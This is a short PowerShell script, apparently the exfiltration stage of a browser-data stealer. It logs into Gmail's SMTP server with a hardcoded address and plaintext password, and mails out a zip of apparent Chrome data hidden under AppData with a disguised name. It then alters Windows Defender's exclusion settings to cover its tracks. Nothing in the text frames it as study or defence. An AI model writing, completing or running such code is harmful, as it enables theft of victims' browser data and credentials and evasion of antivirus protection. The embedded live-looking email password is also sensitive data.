#Mailing the output you will need to enable less secure app access on your google account for this to work
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$ReportEmail = new-object Net.Mail.MailMessage
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.com', 'Milo36912!');
$ReportEmail.From = 'beneafrr@gmail.com'
$ReportEmail.To.Add('beneafrr@gmail.com')
$ReportEmail.Subject = "Googlechrome"
$ReportEmail.Body = 'Opening web.'
$files=Get-ChildItem 
$ReportEmail.Attachments.Add("$env:appdata\Microsoft\microsoftstorage\google.zip")
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Dispose()
$SMTPInfo.Dispose()
#Cleanup
cd "$env:appdata"
Remove-MpPreference -ExclusionPath "$env:appdata"
